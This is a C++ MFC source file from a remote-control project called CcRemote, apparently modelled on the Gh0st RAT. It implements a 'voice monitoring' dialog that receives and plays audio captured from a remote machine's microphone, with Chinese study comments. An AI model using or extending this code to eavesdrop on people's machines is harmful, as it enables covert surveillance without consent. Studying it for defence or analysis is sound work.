// CAudioDlg.cpp: 实现文件
//

#include "pch.h"
#include "CcRemote.h"
#include "CAudioDlg.h"
#include "afxdialogex.h"
#include "..\..\common\macros.h"

// CAudioDlg 对话框

IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)

CAudioDlg::CAudioDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(IDD_AUDIO, pParent)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_AUDIO));  //处理图标
	m_iocpServer = pIOCPServer;       //为类的成员变量赋值
	m_pContext = pContext;
	m_bIsWorking = true;

	m_nTotalRecvBytes = 0;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));        //得到服务端ip
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
}

CAudioDlg::~CAudioDlg()
{
}

void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Check(pDX, IDC_SEND_LOCALAUDIO, m_bIsSendLocalAudio);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CAudioDlg 消息处理程序


BOOL CAudioDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	str.Format("\\\\%s - 语音监听", m_IPAddress);
	SetWindowText(str);

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


DWORD  CAudioDlg::WorkThread(LPVOID lparam)
{
	CAudioDlg	*pThis = (CAudioDlg *)lparam;

	while (pThis->m_bIsWorking)
	{
		if (!pThis->m_bIsSendLocalAudio)
		{
			Sleep(1000);
			continue;
		}
		DWORD	dwBytes = 0;
		LPBYTE	lpBuffer = pThis->m_Audio.getRecordBuffer(&dwBytes);
		if (lpBuffer != NULL && dwBytes > 0)
			pThis->m_iocpServer->Send(pThis->m_pContext, lpBuffer, dwBytes);
	}
	return 0;
}


void CAudioDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_pContext->m_Dialog[0] = 0;

	closesocket(m_pContext->m_Socket);

	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CDialog::OnClose();
}


void CAudioDlg::OnReceiveComplete(void)
{
	m_nTotalRecvBytes += m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	CString	str;
	str.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIPS, str);
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
		//这里也非常简洁，就是将服务端发送来的数据播放出来，我们看一下这个类还是CAudio，哈哈
		//原来播放和录制是同一个类，我们转到这个函数
	case TOKEN_AUDIO_DATA:
		m_Audio.playBuffer(m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	default:
		// 传输发生异常数据
		return;
	}
}
